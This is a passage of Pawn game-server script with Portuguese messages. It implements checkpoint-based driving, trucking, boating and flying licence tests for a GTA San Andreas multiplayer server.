			return 1;
		}
		case 14:
		{

			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid,0,AutoPoints2[14][0], AutoPoints2[14][1], AutoPoints2[14][2],AutoPoints2[15][0], AutoPoints2[15][1], AutoPoints2[15][2], 7);
			Checks2[playerid] = 15;
			return 1;
		}
		case 15:
		{

			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid,0,AutoPoints2[15][0], AutoPoints2[15][1], AutoPoints2[15][2],AutoPoints2[16][0], AutoPoints2[16][1], AutoPoints2[16][2], 7);
			Checks2[playerid] = 16;
			return 1;
		}
		case 16:
		{

			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid,0,AutoPoints2[16][0], AutoPoints2[16][1], AutoPoints2[16][2],AutoPoints2[17][0], AutoPoints2[17][1], AutoPoints2[17][2], 7);
			Checks2[playerid] = 17;
			return 1;
		}
		case 17:
		{

			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid,0,AutoPoints2[17][0], AutoPoints2[17][1], AutoPoints2[17][2],AutoPoints2[18][0], AutoPoints2[18][1], AutoPoints2[18][2], 7);
			Checks2[playerid] = 18;
			return 1;
		}
		case 18:
		{

			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid,0,AutoPoints2[18][0], AutoPoints2[18][1], AutoPoints2[18][2],AutoPoints2[19][0], AutoPoints2[19][1], AutoPoints2[19][2], 7);
			Checks2[playerid] = 19;
			return 1;
		}
		case 19:
		{

			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid,0,AutoPoints2[19][0], AutoPoints2[19][1], AutoPoints2[19][2],AutoPoints2[20][0], AutoPoints2[20][1], AutoPoints2[20][2], 7);
			Checks2[playerid] = 20;
			return 1;
		}
		case 20:
		{

			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid,0,AutoPoints2[20][0], AutoPoints2[20][1], AutoPoints2[20][2],AutoPoints2[21][0], AutoPoints2[21][1], AutoPoints2[21][2], 7);
			Checks2[playerid] = 21;
			return 1;
		}
		case 21:
		{

			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid,0,AutoPoints2[21][0], AutoPoints2[21][1], AutoPoints2[21][2],AutoPoints2[22][0], AutoPoints2[22][1], AutoPoints2[22][2], 7);
			Checks2[playerid] = 22;
			return 1;
		}
		case 22:
		{

			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid,0,AutoPoints2[22][0], AutoPoints2[22][1], AutoPoints2[22][2],AutoPoints2[23][0], AutoPoints2[23][1], AutoPoints2[23][2], 7);
			Checks2[playerid] = 23;
			return 1;
		}
		case 23:
		{

			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid,0,AutoPoints2[23][0], AutoPoints2[23][1], AutoPoints2[23][2],AutoPoints2[24][0], AutoPoints2[24][1], AutoPoints2[24][2], 7);
			Checks2[playerid] = 24;
			return 1;
		}
		case 24:
		{

			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid,0,AutoPoints2[24][0], AutoPoints2[24][1], AutoPoints2[24][2],AutoPoints2[25][0], AutoPoints2[25][1], AutoPoints2[25][2], 7);
			Checks2[playerid] = 25;
			return 1;
		}
		case 25:
		{

			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid,0,AutoPoints2[25][0], AutoPoints2[25][1], AutoPoints2[25][2],AutoPoints2[26][0], AutoPoints2[26][1], AutoPoints2[26][2], 7);
			Checks2[playerid] = 26;
			return 1;
		}
		case 26:
		{

			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid,0,AutoPoints2[26][0], AutoPoints2[26][1], AutoPoints2[26][2],AutoPoints2[27][0], AutoPoints2[27][1], AutoPoints2[27][2], 7);
			Checks2[playerid] = 27;
			return 1;
		}
		case 27:
		{

			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid,0,AutoPoints2[27][0], AutoPoints2[27][1], AutoPoints2[27][2],AutoPoints2[28][0], AutoPoints2[28][1], AutoPoints2[28][2], 7);
			Checks2[playerid] = 28;
			return 1;
		}
		case 28:
		{

			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid,0,AutoPoints2[28][0], AutoPoints2[28][1], AutoPoints2[28][2],AutoPoints2[29][0], AutoPoints2[29][1], AutoPoints2[29][2], 7);
			Checks2[playerid] = 29;
			return 1;
		}
		case 29:
		{

			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid,0,AutoPoints2[29][0], AutoPoints2[29][1], AutoPoints2[29][2],AutoPoints2[30][0], AutoPoints2[30][1], AutoPoints2[30][2], 7);
			Checks2[playerid] = 30;
			return 1;
		}
		case 30:
		{

			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid,0,AutoPoints2[30][0], AutoPoints2[30][1], AutoPoints2[30][2],AutoPoints2[31][0], AutoPoints2[31][1], AutoPoints2[31][2], 7);
			Checks2[playerid] = 31;
			return 1;
		}
		case 31:
		{

			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid,0,AutoPoints2[31][0], AutoPoints2[31][1], AutoPoints2[31][2],AutoPoints2[32][0], AutoPoints2[32][1], AutoPoints2[32][2], 7);
			Checks2[playerid] = 32;
			return 1;
		}
		case 32:
		{

			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid,0,AutoPoints2[32][0], AutoPoints2[32][1], AutoPoints2[32][2],AutoPoints2[33][0], AutoPoints2[33][1], AutoPoints2[33][2], 7);
			Checks2[playerid] = 33;
			return 1;
		}
		case 33:
		{

			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid,0,AutoPoints2[33][0], AutoPoints2[33][1], AutoPoints2[33][2],AutoPoints2[34][0], AutoPoints2[34][1], AutoPoints2[34][2], 7);
			Checks2[playerid] = 34;
			return 1;
		}
		case 34:
		{

			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid,0,AutoPoints2[33][0], AutoPoints2[33][1], AutoPoints2[33][2],AutoPoints2[34][0], AutoPoints2[34][1], AutoPoints2[34][2], 7);
			Checks2[playerid] = 35;
			return 1;
		}
		case 35:
		{

			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid,0,AutoPoints2[34][0], AutoPoints2[34][1], AutoPoints2[34][2],AutoPoints2[36][0], AutoPoints2[36][1], AutoPoints2[36][2], 7);
			Checks2[playerid] = 36;
			return 1;
		}
		case 36:
		{

			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid,0,AutoPoints2[35][0], AutoPoints2[35][1], AutoPoints2[35][2],AutoPoints2[37][0], AutoPoints2[37][1], AutoPoints2[37][2], 7);
			Checks2[playerid] = 37;
			return 1;
		}
		case 37:
		{

			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid,0,AutoPoints2[36][0], AutoPoints2[36][1], AutoPoints2[36][2],AutoPoints2[38][0], AutoPoints2[38][1], AutoPoints2[38][2], 7);
			Checks2[playerid] = 38;
			return 1;
		}
		case 38:
		{

			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid,0,AutoPoints2[37][0], AutoPoints2[37][1], AutoPoints2[37][2],AutoPoints2[38][0], AutoPoints2[38][1], AutoPoints2[38][2], 7);
			Checks2[playerid] = 39;
			return 1;
		}
		case 39:
		{

			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid, 1, AutoPoints2[38][0], AutoPoints2[38][1], AutoPoints2[38][2],AutoPoints2[38][0], AutoPoints2[38][1], AutoPoints2[38][2], 7);
			Checks2[playerid] = 40;
			return 1;
		}
		case 40:
		{

			if(IsPlayerInVehicle(playerid, carroauto2[playerid]))
			{

				new Float:lataria;
				GetVehicleHealth(carroauto2[playerid], lataria);
				if(lataria < 800)
				{

					DisablePlayerRaceCheckpoint(playerid);
					new currentveh;
					currentveh = GetPlayerVehicleID(playerid);
					DestroyVehicle(currentveh);
					SendClientMessage(playerid, COR_ERRO,"Reprovado. Você danificou o veículo e não passou no teste!");
					return 1;
				}
				DisablePlayerRaceCheckpoint(playerid);
				GameTextForPlayer(playerid, "APROVADO!", 3000, 1);
				pInfo[playerid][HabTCarro] = 1;
				SetPlayerPos(playerid, -2026.8789, -103.6022, 1035.1833);
				SetPlayerInterior(playerid, 3);
				pInfo[playerid][EntrouL] = true;
				WE_SetInt(gFile, "HabTCarro", 1);
				WE_SaveFile();
				InAutoEscola2[playerid] = 0;
				new currentveh;
				currentveh = GetPlayerVehicleID(playerid);
				DestroyVehicle(currentveh);
				return 1;
			}
			else
			{

				DisablePlayerRaceCheckpoint(playerid);
				new currentveh;
				currentveh = GetPlayerVehicleID(playerid);
				DestroyVehicle(currentveh);
				SendClientMessage(playerid,COR_ERRO,"Reprovado. Você não está no veículo da Auto-Escola!");
				return 1;
			}
		}
	}
	switch(Checks3[playerid])
	{

		case 1:
		{

			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid,0,AutoPoints3[1][0], AutoPoints3[1][1], AutoPoints3[1][2],AutoPoints3[2][0], AutoPoints3[2][1], AutoPoints3[2][2], 7);
			Checks3[playerid] = 2;
			return 1;
		}
		case 2:
		{

			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid,0,AutoPoints3[2][0], AutoPoints3[2][1], AutoPoints3[2][2],AutoPoints3[3][0], AutoPoints3[3][1], AutoPoints3[3][2], 7);
			Checks3[playerid] = 3;
			return 1;
		}
		case 3:
		{

			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid,0,AutoPoints3[3][0], AutoPoints3[3][1], AutoPoints3[3][2],AutoPoints3[4][0], AutoPoints3[4][1], AutoPoints3[4][2], 7);
			Checks3[playerid] = 4;
			return 1;
		}
		case 4:
		{

			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid,0,AutoPoints3[4][0], AutoPoints3[4][1], AutoPoints3[4][2],AutoPoints3[5][0], AutoPoints3[5][1], AutoPoints3[5][2], 7);
			Checks3[playerid] = 5;
			return 1;
		}
		case 5:
		{

			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid,0,AutoPoints3[5][0], AutoPoints3[5][1], AutoPoints3[5][2],AutoPoints3[6][0], AutoPoints3[6][1], AutoPoints3[6][2], 7);
			Checks3[playerid] = 6;
			return 1;
		}
		case 6:
		{

			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid,0,AutoPoints3[6][0], AutoPoints3[6][1], AutoPoints3[6][2],AutoPoints3[7][0], AutoPoints3[7][1], AutoPoints3[7][2], 7);
			Checks3[playerid] = 7;
			return 1;
		}
		case 7:
		{

			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid,0,AutoPoints3[7][0], AutoPoints3[7][1], AutoPoints3[7][2],AutoPoints3[8][0], AutoPoints3[8][1], AutoPoints3[8][2], 7);
			Checks3[playerid] = 8;
			return 1;
		}
		case 8:
		{

			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid,0,AutoPoints3[8][0], AutoPoints3[8][1], AutoPoints3[8][2],AutoPoints3[9][0], AutoPoints3[9][1], AutoPoints3[9][2], 7);
			Checks3[playerid] = 9;
			return 1;
		}
		case 9:
		{

			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid,0,AutoPoints3[9][0], AutoPoints3[9][1], AutoPoints3[9][2],AutoPoints3[10][0], AutoPoints3[10][1], AutoPoints3[10][2], 7);
			Checks3[playerid] = 10;
			return 1;
		}
		case 10:
		{

			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid,0,AutoPoints3[10][0], AutoPoints3[10][1], AutoPoints3[10][2],AutoPoints3[11][0], AutoPoints3[11][1], AutoPoints3[11][2], 7);
			Checks3[playerid] = 11;
			return 1;
		}
		case 11:
		{

			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid,0,AutoPoints3[11][0], AutoPoints3[11][1], AutoPoints3[11][2],AutoPoints3[12][0], AutoPoints3[12][1], AutoPoints3[12][2], 7);
			Checks3[playerid] = 12;
			return 1;
		}
		case 12:
		{

			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid,0,AutoPoints3[12][0], AutoPoints3[12][1], AutoPoints3[12][2],AutoPoints3[13][0], AutoPoints3[13][1], AutoPoints3[13][2], 7);
			Checks3[playerid] = 13;
			return 1;
		}
		case 13:
		{

			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid,0,AutoPoints3[13][0], AutoPoints3[13][1], AutoPoints3[13][2],AutoPoints3[14][0], AutoPoints3[14][1], AutoPoints3[14][2], 7);
			Checks3[playerid] = 14;
			return 1;
		}
		case 14:
		{

			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid,0,AutoPoints3[14][0], AutoPoints3[14][1], AutoPoints3[14][2],AutoPoints3[15][0], AutoPoints3[15][1], AutoPoints3[15][2], 7);
			Checks3[playerid] = 15;
			return 1;
		}
		case 15:
		{

			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid,0,AutoPoints3[15][0], AutoPoints3[15][1], AutoPoints3[15][2],AutoPoints3[16][0], AutoPoints3[16][1], AutoPoints3[16][2], 7);
			Checks3[playerid] = 16;
			return 1;
		}
		case 16:
		{

			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid,0,AutoPoints3[16][0], AutoPoints3[16][1], AutoPoints3[16][2],AutoPoints3[17][0], AutoPoints3[17][1], AutoPoints3[17][2], 7);
			Checks3[playerid] = 17;
			return 1;
		}
		case 17:
		{

			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid,0,AutoPoints3[17][0], AutoPoints3[17][1], AutoPoints3[17][2],AutoPoints3[17][0], AutoPoints3[17][1], AutoPoints3[17][2], 7);
			Checks3[playerid] = 18;
			return 1;
		}
		case 18:
		{

			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid,0,AutoPoints3[18][0], AutoPoints3[18][1], AutoPoints3[18][2],AutoPoints3[19][0], AutoPoints3[19][1], AutoPoints3[19][2], 7);
			Checks3[playerid] = 19;
			return 1;
		}
		case 19:
		{

			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid,0,AutoPoints3[19][0], AutoPoints3[19][1], AutoPoints3[19][2],AutoPoints3[20][0], AutoPoints3[20][1], AutoPoints3[20][2], 7);
			Checks3[playerid] = 20;
			return 1;
		}
		case 20:
		{

			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid,0,AutoPoints3[20][0], AutoPoints3[20][1], AutoPoints3[20][2],AutoPoints3[21][0], AutoPoints3[21][1], AutoPoints3[21][2], 7);
			Checks3[playerid] = 21;
			return 1;
		}
		case 21:
		{

			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid,0,AutoPoints3[21][0], AutoPoints3[21][1], AutoPoints3[21][2],AutoPoints3[22][0], AutoPoints3[22][1], AutoPoints3[22][2], 7);
			Checks3[playerid] = 22;
			return 1;
		}
		case 22:
		{

			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid,0,AutoPoints3[22][0], AutoPoints3[22][1], AutoPoints3[22][2],AutoPoints3[23][0], AutoPoints3[23][1], AutoPoints3[23][2], 7);
			Checks3[playerid] = 23;
			return 1;
		}
		case 23:
		{

			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid,0,AutoPoints3[23][0], AutoPoints3[23][1], AutoPoints3[23][2],AutoPoints3[24][0], AutoPoints3[24][1], AutoPoints3[24][2], 7);
			Checks3[playerid] = 24;
			return 1;
		}
		case 24:
		{

			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid,0,AutoPoints3[24][0], AutoPoints3[24][1], AutoPoints3[24][2],AutoPoints3[25][0], AutoPoints3[25][1], AutoPoints3[25][2], 7);
			Checks3[playerid] = 25;
			return 1;
		}
		case 25:
		{

			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid,0,AutoPoints3[25][0], AutoPoints3[25][1], AutoPoints3[25][2],AutoPoints3[26][0], AutoPoints3[26][1], AutoPoints3[26][2], 7);
			Checks3[playerid] = 26;
			return 1;
		}
		case 26:
		{

			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid,0,AutoPoints3[26][0], AutoPoints3[26][1], AutoPoints3[26][2],AutoPoints3[27][0], AutoPoints3[27][1], AutoPoints3[27][2], 7);
			Checks3[playerid] = 27;
			return 1;
		}
		case 27:
		{

			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid,0,AutoPoints3[27][0], AutoPoints3[27][1], AutoPoints3[27][2],AutoPoints3[28][0], AutoPoints3[28][1], AutoPoints3[28][2], 7);
			Checks3[playerid] = 28;
			return 1;
		}
		case 28:
		{

			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid,0,AutoPoints3[28][0], AutoPoints3[28][1], AutoPoints3[28][2],AutoPoints3[29][0], AutoPoints3[29][1], AutoPoints3[29][2], 7);
			Checks3[playerid] = 29;
			return 1;
		}
		case 29:
		{

			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid,0,AutoPoints3[29][0], AutoPoints3[29][1], AutoPoints3[29][2],AutoPoints3[30][0], AutoPoints3[30][1], AutoPoints3[30][2], 7);
			Checks3[playerid] = 30;
			return 1;
		}
		case 30:
		{

			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid,0,AutoPoints3[30][0], AutoPoints3[30][1], AutoPoints3[30][2],AutoPoints3[31][0], AutoPoints3[31][1], AutoPoints3[31][2], 7);
			Checks3[playerid] = 31;
			return 1;
		}
		case 31:
		{

			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid,0,AutoPoints3[31][0], AutoPoints3[31][1], AutoPoints3[31][2],AutoPoints3[32][0], AutoPoints3[32][1], AutoPoints3[32][2], 7);
			Checks3[playerid] = 32;
			return 1;
		}
		case 32:
		{

			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid,0,AutoPoints3[32][0], AutoPoints3[32][1], AutoPoints3[32][2],AutoPoints3[33][0], AutoPoints3[33][1], AutoPoints3[33][2], 7);
			Checks3[playerid] = 33;
			return 1;
		}
		case 33:
		{

			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid,0,AutoPoints3[33][0], AutoPoints3[33][1], AutoPoints3[33][2],AutoPoints3[34][0], AutoPoints3[34][1], AutoPoints3[34][2], 7);
			Checks3[playerid] = 34;
			return 1;
		}
		case 34:
		{

			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid,0,AutoPoints3[33][0], AutoPoints3[33][1], AutoPoints3[33][2],AutoPoints3[35][0], AutoPoints3[35][1], AutoPoints3[35][2], 7);
			Checks3[playerid] = 35;
			return 1;
		}
		case 35:
		{

			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid,0,AutoPoints3[34][0], AutoPoints3[34][1], AutoPoints3[34][2],AutoPoints3[35][0], AutoPoints3[35][1], AutoPoints3[35][2], 7);
			Checks3[playerid] = 36;
			return 1;
		}
		case 36:
		{

			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid,0,AutoPoints3[35][0], AutoPoints3[35][1], AutoPoints3[35][2],AutoPoints3[36][0], AutoPoints3[36][1], AutoPoints3[36][2], 7);
			Checks3[playerid] = 37;
			return 1;
		}
		case 37:
		{

			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid,0,AutoPoints3[36][0], AutoPoints3[36][1], AutoPoints3[36][2],AutoPoints3[37][0], AutoPoints3[37][1], AutoPoints3[37][2], 7);
			Checks3[playerid] = 38;
			return 1;
		}
		case 38:
		{

			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid,0,AutoPoints3[37][0], AutoPoints3[37][1], AutoPoints3[37][2],AutoPoints3[38][0], AutoPoints3[38][1], AutoPoints3[38][2], 7);
			Checks3[playerid] = 39;
			return 1;
		}
		case 39:
		{

			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid, 1, AutoPoints3[38][0], AutoPoints3[38][1], AutoPoints3[38][2],AutoPoints3[38][0], AutoPoints3[38][1], AutoPoints3[38][2], 7);
			Checks3[playerid] = 40;
			return 1;
		}
		case 40:
		{

			if(IsPlayerInVehicle(playerid, carroauto3[playerid]))
			{

				new Float:lataria;
				GetVehicleHealth(carroauto3[playerid], lataria);
				if(lataria < 800)
				{

					DisablePlayerRaceCheckpoint(playerid);
					new currentveh;
					currentveh = GetPlayerVehicleID(playerid);
					DestroyVehicle(currentveh);
					SendClientMessage(playerid, COR_ERRO,"Reprovado. Você danificou o veículo e não passou no teste!");
					return 1;
				}
				DisablePlayerRaceCheckpoint(playerid);
				GameTextForPlayer(playerid, "APROVADO!", 3000, 1);
				pInfo[playerid][HabTCaminhao] = 1;
				SetPlayerPos(playerid, -2026.8789, -103.6022, 1035.1833);
				SetPlayerInterior(playerid, 3);
				pInfo[playerid][EntrouL] = true;
				WE_SetInt(gFile, "HabTCaminhao", 1);
				WE_SaveFile();
				InAutoEscola3[playerid] = 0;
				new currentveh;
				currentveh = GetPlayerVehicleID(playerid);
				DestroyVehicle(currentveh);
				return 1;
			}
			else
			{

				DisablePlayerRaceCheckpoint(playerid);
				new currentveh;
				currentveh = GetPlayerVehicleID(playerid);
				DestroyVehicle(currentveh);
				SendClientMessage(playerid,COR_ERRO,"Reprovado. Você não está no veículo da Auto-Escola!");
				return 1;
			}
		}
	}
	switch(Checks4[playerid])
	{

		case 1:
		{

			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid,0,AutoPoints4[1][0], AutoPoints4[1][1], AutoPoints4[1][2],AutoPoints4[2][0], AutoPoints4[2][1], AutoPoints4[2][2], 10);
			Checks4[playerid] = 2;
			return 1;
		}
		case 2:
		{

			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid,0,AutoPoints4[2][0], AutoPoints4[2][1], AutoPoints4[2][2],AutoPoints4[3][0], AutoPoints4[3][1], AutoPoints4[3][2], 10);
			Checks4[playerid] = 3;
			return 1;
		}
		case 3:
		{

			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid,0,AutoPoints4[3][0], AutoPoints4[3][1], AutoPoints4[3][2],AutoPoints4[4][0], AutoPoints4[4][1], AutoPoints4[4][2], 10);
			Checks4[playerid] = 4;
			return 1;
		}
		case 4:
		{

			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid,0,AutoPoints4[4][0], AutoPoints4[4][1], AutoPoints4[4][2],AutoPoints4[5][0], AutoPoints4[5][1], AutoPoints4[5][2], 10);
			Checks4[playerid] = 5;
			return 1;
		}
		case 5:
		{

			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid,0,AutoPoints4[5][0], AutoPoints4[5][1], AutoPoints4[5][2],AutoPoints4[6][0], AutoPoints4[6][1], AutoPoints4[6][2], 10);
			Checks4[playerid] = 6;
			return 1;
		}
		case 6:
		{

			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid,0,AutoPoints4[6][0], AutoPoints4[6][1], AutoPoints4[6][2],AutoPoints4[7][0], AutoPoints4[7][1], AutoPoints4[7][2], 10);
			Checks4[playerid] = 7;
			return 1;
		}
		case 7:
		{

			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid,0,AutoPoints4[7][0], AutoPoints4[7][1], AutoPoints4[7][2],AutoPoints4[8][0], AutoPoints4[8][1], AutoPoints4[8][2], 10);
			Checks4[playerid] = 8;
			return 1;
		}
		case 8:
		{

			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid,0,AutoPoints4[8][0], AutoPoints4[8][1], AutoPoints4[8][2],AutoPoints4[9][0], AutoPoints4[9][1], AutoPoints4[9][2], 10);
			Checks4[playerid] = 9;
			return 1;
		}
		case 9:
		{

			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid,0,AutoPoints4[9][0], AutoPoints4[9][1], AutoPoints4[9][2],AutoPoints4[10][0], AutoPoints4[10][1], AutoPoints4[10][2], 10);
			Checks4[playerid] = 10;
			return 1;
		}
		case 10:
		{

			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid,0,AutoPoints4[10][0], AutoPoints4[10][1], AutoPoints4[10][2],AutoPoints4[11][0], AutoPoints4[11][1], AutoPoints4[11][2], 10);
			Checks4[playerid] = 11;
			return 1;
		}
		case 11:
		{

			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid,0,AutoPoints4[11][0], AutoPoints4[11][1], AutoPoints4[11][2],AutoPoints4[12][0], AutoPoints4[12][1], AutoPoints4[12][2], 10);
			Checks4[playerid] = 12;
			return 1;
		}
		case 12:
		{

			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid,0,AutoPoints4[12][0], AutoPoints4[12][1], AutoPoints4[12][2],AutoPoints4[13][0], AutoPoints4[13][1], AutoPoints4[13][2], 10);
			Checks4[playerid] = 13;
			return 1;
		}
		case 13:
		{

			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid,0,AutoPoints4[13][0], AutoPoints4[13][1], AutoPoints4[13][2],AutoPoints4[14][0], AutoPoints4[14][1], AutoPoints4[14][2], 10);
			Checks4[playerid] = 14;
			return 1;
		}
		case 14:
		{

			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid,0,AutoPoints4[13][0], AutoPoints4[13][1], AutoPoints4[13][2],AutoPoints4[14][0], AutoPoints4[14][1], AutoPoints4[14][2], 10);
			Checks4[playerid] = 15;
			return 1;
		}
		case 15:
		{

			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid,0,AutoPoints4[14][0], AutoPoints4[14][1], AutoPoints4[14][2],AutoPoints4[15][0], AutoPoints4[15][1], AutoPoints4[15][2], 10);
			Checks4[playerid] = 16;
			return 1;
		}
		case 16:
		{

			if(IsPlayerInVehicle(playerid, carroauto4[playerid]))
			{

				new Float:lataria;
				GetVehicleHealth(carroauto4[playerid], lataria);
				if(lataria < 900)
				{

					DisablePlayerRaceCheckpoint(playerid);
					new currentveh;
					currentveh = GetPlayerVehicleID(playerid);
					DestroyVehicle(currentveh);
					SendClientMessage(playerid, COR_ERRO,"Reprovado. Você danificou o veículo e não passou no teste!");
					return 1;
				}
				DisablePlayerRaceCheckpoint(playerid);
				GameTextForPlayer(playerid, "APROVADO!", 3000, 1);
				pInfo[playerid][HabNBarco] = 1;
				SetPlayerPos(playerid, -2026.8789, -103.6022, 1035.1833);
				SetPlayerInterior(playerid, 3);
				pInfo[playerid][EntrouL] = true;
				WE_SetInt(gFile, "HabNBarco", 1);
				WE_SaveFile();
				InAutoEscola4[playerid] = 0;
				new currentveh;
				currentveh = GetPlayerVehicleID(playerid);
				DestroyVehicle(currentveh);
				return 1;
			}
			else
			{

				DisablePlayerRaceCheckpoint(playerid);
				new currentveh;
				currentveh = GetPlayerVehicleID(playerid);
				DestroyVehicle(currentveh);
				SendClientMessage(playerid,COR_ERRO,"Reprovado. Você não está no veículo da Auto-Escola!");
				return 1;
			}
		}
	}
	switch(Checks5[playerid])
	{

		case 1:
		{

			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid,0,AutoPoints5[1][0], AutoPoints5[1][1], AutoPoints5[1][2],AutoPoints5[1][0], AutoPoints5[1][1], AutoPoints5[1][2], 10);
			Checks5[playerid] = 2;
			return 1;
		}
		case 2:
		{

			DisablePlayerRaceCheckpoint(playerid);
			SetPlayerRaceCheckpoint(playerid,0,AutoPoints5[1][0], AutoPoints5[1][1], AutoPoints5[1][2],AutoPoints5[1][0], AutoPoints5[1][1], AutoPoints5[1][2], 10);
			Checks5[playerid] = 3;
			return 1;
		}
		case 3:
		{

			if(IsPlayerInVehicle(playerid, carroauto5[playerid]))
			{

				new Float:lataria;
				GetVehicleHealth(carroauto5[playerid], lataria);
				if(lataria < 900)
				{

					DisablePlayerRaceCheckpoint(playerid);
					new currentveh;
					currentveh = GetPlayerVehicleID(playerid);
					DestroyVehicle(currentveh);
					SendClientMessage(playerid, COR_ERRO,"Reprovado. Você danificou o veículo e não passou no teste!");
					return 1;
				}
				DisablePlayerRaceCheckpoint(playerid);
				GameTextForPlayer(playerid, "APROVADO !", 3000, 1);
				pInfo[playerid][HabAAviao] = 1;
				SetPlayerPos(playerid, -2026.8789, -103.6022, 1035.1833);
				SetPlayerInterior(playerid, 3);
